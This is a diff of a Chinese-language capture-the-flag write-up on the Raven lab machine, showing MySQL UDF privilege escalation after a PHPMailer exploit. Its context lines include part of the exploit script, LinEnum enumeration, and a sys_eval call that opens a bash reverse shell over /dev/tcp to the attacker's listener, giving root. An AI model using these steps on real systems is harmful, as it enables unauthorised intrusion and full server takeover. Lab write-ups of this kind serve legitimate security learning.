@@ -1,4 +1,4 @@
-# 0. 本不该有的这篇的
+# 0. 本不该有这篇的
 我相信mysql的UDF提权很多人都听说过，对于很多人来说也不陌生；然而对于我这个入行还不太久的新人来说，一直以来都只是知道其大概的思路：导入用户自定义函数(通过加载插件，windows就是加载`xx.dll`文件，linux就是加载`xx.so`文件),然后间接利用自定义函数执行系统命令。
 然而渗透测试却是一个非常讲究实际操作能力的计算机活动；一个常见漏洞，不是你懂得原理就代表你有能力复现该漏洞，也不是知道的人很多、名气越大，实际中就不会遇见它；个人觉得学习一个漏洞最好的方法就是，懂得其原理-->搭建实际漏洞环境-->亲自复现漏洞。整个过程是非常痛苦的，尤其是搭建漏洞环境：费事费力，会花费你大量的时间，还不一定能成功；问题摆出来，就必须想办法克服，我的办法就是寻找现成的靶机环境暂时弥补动手能力的不足。
 
@@ -93,8 +93,13 @@
 
 <img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/1.png" width="56%">
 
+
+
 > 4. 找到网站使用了	PHPMailer而且版本是5.2.16，网站路径是`/var/www/html/vendor`
 
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/2.png" width="56%">
+
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/3.png" width="56%">
 
 > 5. phpmailer  exploit
 > 
@@ -267,6 +272,9 @@ if r.status_code == 200:
     print('[+]  ExPLoITeD ' + target)
 
 ```
+
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/4.png" width="56%">
+
 
 > 6. mysql提权
 > 上传LinEnum.sh脚本并执行：
@@ -1375,6 +1383,8 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 
 ### SCAN COMPLETE ####################################
 ```
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/5.png" width="56%">
+
 **其中有一个，mysql的服务还加载了插件目录**
 ```/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306```
 > create table foo(line blob);
@@ -1393,7 +1403,7 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 > kali监听：nc -lvp 5555
 > mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
 成功拿到root权限
-
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/6.png" width="56%">
 > 至于flag，大家自己找吧，我知道的应该就4个
 > root@Raven:/var/www/html/vendor# cat PATH
 > cat PATH
@@ -1413,7 +1423,7 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 > -rw-rw-rw- 1 www-data www-data 10411 Nov  9  2018 flag3.png
 > root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# cp flag3.png /var/www/html  # 复制到网站目录
 > root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# chmod 777 /var/www/html/flag3.png  # 添加访问权限
-
+<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/7.png" width="56%">
 > root@Raven:/root# cat flag4.txt
 > cat flag4.txt
 >   ___                   ___ ___
